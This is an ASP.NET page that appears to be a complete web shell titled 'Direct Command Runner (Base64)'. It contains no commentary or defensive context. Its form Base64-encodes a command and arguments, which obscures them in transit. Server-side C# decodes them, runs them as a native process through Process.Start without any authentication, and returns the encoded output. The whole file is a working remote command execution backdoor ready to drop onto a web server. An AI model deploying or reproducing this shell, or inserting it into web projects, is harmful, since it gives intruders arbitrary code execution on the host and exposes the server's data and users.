<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head>
    <title>Direct Command Runner (Base64)</title>
    <style>
        body {
            font-family: Consolas, monospace;
            background: #1e1e1e;
            color: #00ff00;
            padding: 40px;
        }
        #container {
            max-width: 800px;
            margin: auto;
            background: #2e2e2e;
            padding: 20px;
            border-radius: 10px;
        }
        textarea, input, button {
            width: 100%;
            margin-top: 10px;
        }
        textarea {
            height: 300px;
            background: black;
            color: #0f0;
            padding: 10px;
            border: none;
            resize: none;
        }
        input, button {
            padding: 10px;
            font-size: 16px;
        }
    </style>
    <script>
        async function sendCommand(event) {
            event.preventDefault();
            const cmd = document.getElementById("cmdinput").value.trim();
            const args = document.getElementById("argsinput").value.trim();

            const b64cmd = btoa(unescape(encodeURIComponent(cmd)));
            const b64args = btoa(unescape(encodeURIComponent(args)));

            const formData = new FormData();
            formData.append("b64cmd", b64cmd);
            formData.append("b64args", b64args);

            const response = await fetch("", { method: "POST", body: formData });
            const outputB64 = await response.text();
            const output = decodeURIComponent(escape(atob(outputB64)));
            document.getElementById("output").value = output;
        }
    </script>
</head>
<body>
    <div id="container">
        <h2>Run Native Executables (Base64)</h2>
        <form onsubmit="sendCommand(event)">
            <input type="text" id="cmdinput" placeholder="Command (e.g. ipconfig, powershell, python)" />
            <input type="text" id="argsinput" placeholder="Arguments (optional)" />
            <button type="submit">Run</button>
        </form>
        <textarea id="output" readonly></textarea>
    </div>

<%
    if (IsPostBack && !string.IsNullOrEmpty(Request.Form["b64cmd"]))
    {
        try
        {
            string b64cmd = Request.Form["b64cmd"];
            string b64args = Request.Form["b64args"] ?? "";

            string cmd = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(b64cmd));
            string args = string.IsNullOrEmpty(b64args) ? "" : System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(b64args));

            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
            psi.FileName = cmd;
            psi.Arguments = args;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                string full = output + (string.IsNullOrWhiteSpace(error) ? "" : "\n[ERROR]\n" + error);
                string resultB64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(full));
                Response.Write(resultB64);
                Response.End();
            }
        }
        catch (Exception ex)
        {
            string resultB64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes("Exception: " + ex.Message));
            Response.Write(resultB64);
            Response.End();
        }
    }
%>
</body>
</html>
